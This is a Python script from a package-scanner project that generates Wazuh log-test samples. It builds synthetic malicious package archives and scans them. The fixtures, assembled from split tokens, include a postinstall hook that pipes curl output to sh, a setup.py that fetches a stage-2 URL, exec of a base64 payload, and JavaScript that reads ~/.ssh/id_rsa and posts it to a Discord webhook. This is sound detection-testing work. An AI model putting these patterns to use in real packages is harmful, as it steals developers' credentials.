"""Generate the wazuh-logtest samples by running the real scanner.

Usage::

    python scripts/make_logtest_samples.py --out DIR

DIR must be OUTSIDE the repository. The samples are never committed: their
evidence snippets hold the very strings our YARA rules match, so the repo guard
(tests/test_esl003.py) would flag them, and so would AV scanners on a clone.

Each case builds a small synthetic archive in memory (tests/builders.py; every
malicious-looking string is assembled from tokens, and the "payloads" only
decode to a harmless print), writes it to a temporary directory outside the
repo, and scans it with ``eslabon.cli.main`` -- the real worker, rules, OSV
logic and emitter. Nothing is installed or executed, and nothing touches the
network: OSV gets a recorded answer (a real-shaped MAL record from
tests/data/osv for ESL-006, an empty ``{}`` otherwise, or an opener that raises
for osv_unavailable), and ESL-005 gets a fixed top list (``requests``).

Output, one JSON line per file:

    esl-001.jsonl .. esl-006.jsonl   the finding event of that rule
    scan-ok.jsonl                    summary of a clean scan (status ok)
    scan-incomplete.jsonl            summary with status incomplete
    scan-osv-unavailable.jsonl       summary with status osv_unavailable

integrations/wazuh/README.md says which Wazuh rule each one must reach.
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import tempfile
from collections.abc import Callable
from pathlib import Path
from typing import NamedTuple

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tests"))

from builders import (  # noqa: E402
    TarItem,
    ZipItem,
    make_tar,
    make_zip,
    zip_patch_member,
)

import eslabon.cli as cli  # noqa: E402
from eslabon import osv, typosquat  # noqa: E402

NL = chr(10)
# Tokens, so this file never holds a literal our own rules would match.
URLOPEN = "url" + "open"
URLLIB_REQ = "urllib" + ".request"
EX = "ex" + "ec"
B64D = "b64" + "decode"
CURL = "cu" + "rl"
PIPE_SH = "| " + "sh"
EVIL = "https" + "://example.invalid/stage2"
SSH_KEY = "." + "ssh/id_" + "rsa"
DISCORD = "https" + "://discord" + ".com/api/web" + "hooks/123/abc"
PAYLOAD_B64 = base64.b64encode(b"print('eslabon-fixture')").decode("ascii")
MAL_ANSWER = (ROOT / "tests" / "data" / "osv" / "mal_paypalize.json").read_bytes()

Opener = Callable[[str, bytes, float], tuple[str, bytes]]


def _empty(url: str, data: bytes, timeout: float) -> tuple[str, bytes]:
    return osv.API_URL, b"{}"


def _mal(url: str, data: bytes, timeout: float) -> tuple[str, bytes]:
    return osv.API_URL, MAL_ANSWER


def _down(url: str, data: bytes, timeout: float) -> tuple[str, bytes]:
    raise OSError("OSV is down (simulated)")


def _pkg_info(name: str, version: str) -> bytes:
    return f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n\n".encode()


def _npm_json(name: str, scripts: dict | None = None) -> bytes:
    doc: dict = {"name": name, "version": "1.0.0"}
    if scripts:
        doc["scripts"] = scripts
    return json.dumps(doc).encode("ascii")


def _esl001() -> bytes:
    setup = NL.join(
        [
            "from " + URLLIB_REQ + " import " + URLOPEN,
            "from setuptools import setup",
            "",
            "payload = " + URLOPEN + "('" + EVIL + "').read()",
            "setup(name='pkg', version='1.0')",
            "",
        ]
    )
    return make_tar(
        [
            TarItem("pkg-1.0/PKG-INFO", _pkg_info("pkg", "1.0")),
            TarItem("pkg-1.0/setup.py", setup.encode("ascii")),
        ]
    )


def _esl002() -> bytes:
    scripts = {"postinstall": CURL + " -sSL " + EVIL + " " + PIPE_SH}
    return make_tar(
        [
            TarItem("package/package.json", _npm_json("demo", scripts)),
            TarItem("package/index.js", b"module.exports = 1;\n"),
        ]
    )


def _esl003() -> bytes:
    setup = NL.join(
        [
            "import base64",
            "from setuptools import setup",
            "",
            EX + "(base64." + B64D + "('" + PAYLOAD_B64 + "'))",
            "setup(name='demo', version='0.0.1')",
            "",
        ]
    )
    return make_tar(
        [
            TarItem("demo-0.0.1/PKG-INFO", _pkg_info("demo", "0.0.1")),
            TarItem("demo-0.0.1/setup.py", setup.encode("ascii")),
        ]
    )


def _esl004() -> bytes:
    index = NL.join(
        [
            "const fs = require('fs');",
            "const k = fs.readFileSync(require('os').homedir() + '/" + SSH_KEY + "');",
            "fetch('" + DISCORD + "', {method: 'POST', body: k});",
            "",
        ]
    )
    return make_tar(
        [
            TarItem("package/package.json", _npm_json("demo")),
            TarItem("package/index.js", index.encode("ascii")),
        ]
    )


def _esl005() -> bytes:
    return make_tar([TarItem("reqeusts-1.0/PKG-INFO", _pkg_info("reqeusts", "1.0"))])


def _clean_npm(name: str) -> bytes:
    return make_tar(
        [
            TarItem("package/package.json", _npm_json(name)),
            TarItem("package/index.js", b"module.exports = 1;\n"),
        ]
    )


def _encrypted_wheel() -> bytes:
    data = make_zip(
        [
            ZipItem("pkg-1.0.dist-info/METADATA", _pkg_info("pkg", "1.0")),
            ZipItem("pkg/secret.py", b"print(1)\n"),
        ]
    )
    return zip_patch_member(data, "pkg/secret.py", or_flags=0x1)  # "encrypted"


class Case(NamedTuple):
    out_name: str
    archive_name: str
    archive: Callable[[], bytes]
    ecosystem: str
    opener: Opener
    rule_id: str | None = None  # a finding case: keep only this rule's event
    status: str | None = None  # a summary case: keep the summary, check status


CASES = (
    Case("esl-001.jsonl", "pkg-1.0.tar.gz", _esl001, "pypi", _empty, rule_id="ESL-001"),
    Case("esl-002.jsonl", "demo-1.0.0.tgz", _esl002, "npm", _empty, rule_id="ESL-002"),
    Case(
        "esl-003.jsonl", "demo-0.0.1.tar.gz", _esl003, "pypi", _empty,
        rule_id="ESL-003",
    ),
    Case("esl-004.jsonl", "demo-1.0.0.tgz", _esl004, "npm", _empty, rule_id="ESL-004"),
    Case(
        "esl-005.jsonl", "reqeusts-1.0.tar.gz", _esl005, "pypi", _empty,
        rule_id="ESL-005",
    ),
    Case(
        "esl-006.jsonl", "paypalize-1.0.0.tgz", lambda: _clean_npm("paypalize"),
        "npm", _mal, rule_id="ESL-006",
    ),
    Case(
        "scan-ok.jsonl", "left-pad-1.0.0.tgz", lambda: _clean_npm("left-pad"),
        "npm", _empty, status="ok",
    ),
    Case(
        "scan-incomplete.jsonl", "pkg-1.0-py3-none-any.whl", _encrypted_wheel,
        "pypi", _empty, status="incomplete",
    ),
    Case(
        "scan-osv-unavailable.jsonl", "left-pad-1.0.0.tgz",
        lambda: _clean_npm("left-pad"), "npm", _down, status="osv_unavailable",
    ),
)


def _run_case(case: Case, work: Path) -> dict:
    """Scan one synthetic archive with the real CLI; return the event to keep."""
    target = work / case.archive_name
    target.write_bytes(case.archive())
    out = work / (case.out_name + ".raw")
    previous = osv.DEFAULT_OPENER
    osv.DEFAULT_OPENER = case.opener
    try:
        argv = ["scan", str(target), "--ecosystem", case.ecosystem, "--out", str(out)]
        cli.main(argv)
    finally:
        osv.DEFAULT_OPENER = previous
    target.unlink()
    events = [json.loads(x) for x in out.read_text("ascii").splitlines()]
    out.unlink()
    findings = [e for e in events if e["event"]["dataset"] == "eslabon.finding"]
    summary = events[-1]
    if summary["event"]["dataset"] != "eslabon.scan":
        raise RuntimeError(f"{case.out_name}: no scan summary")
    if case.rule_id is not None:
        ids = [e["rule"]["id"] for e in findings]
        if ids != [case.rule_id]:
            raise RuntimeError(f"{case.out_name}: expected [{case.rule_id}], got {ids}")
        return findings[0]
    got = summary["eslabon"]["scan"]["status"]
    if got != case.status or findings:
        raise RuntimeError(f"{case.out_name}: status {got}, {len(findings)} findings")
    return summary


def generate(out_dir: Path) -> list[Path]:
    """Write every sample into ``out_dir``; return the files written."""
    out_dir.mkdir(parents=True, exist_ok=True)
    previous = typosquat._OVERRIDE
    typosquat._OVERRIDE = {
        "pypi": typosquat.TopList.from_names(["requests"], "pypi"),
        "npm": typosquat.TopList.from_names(["react"], "npm"),
    }
    written = []
    try:
        with tempfile.TemporaryDirectory(prefix="eslabon-logtest-") as tmp:
            for case in CASES:
                event = _run_case(case, Path(tmp))
                line = json.dumps(event, ensure_ascii=True, separators=(",", ":"))
                path = out_dir / case.out_name
                path.write_bytes(line.encode("ascii") + b"\n")
                written.append(path)
    finally:
        typosquat._OVERRIDE = previous
    return written


def _inside_repo(path: Path) -> bool:
    real = path.resolve()
    return real == ROOT or ROOT in real.parents


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--out", type=Path, required=True, help="dir outside the repo")
    args = parser.parse_args(argv)
    if _inside_repo(args.out):
        parser.error("--out must be outside the repository (see the docstring)")
    for path in generate(args.out):
        print(path)
    return 0


if __name__ == "__main__":
    sys.exit(main())
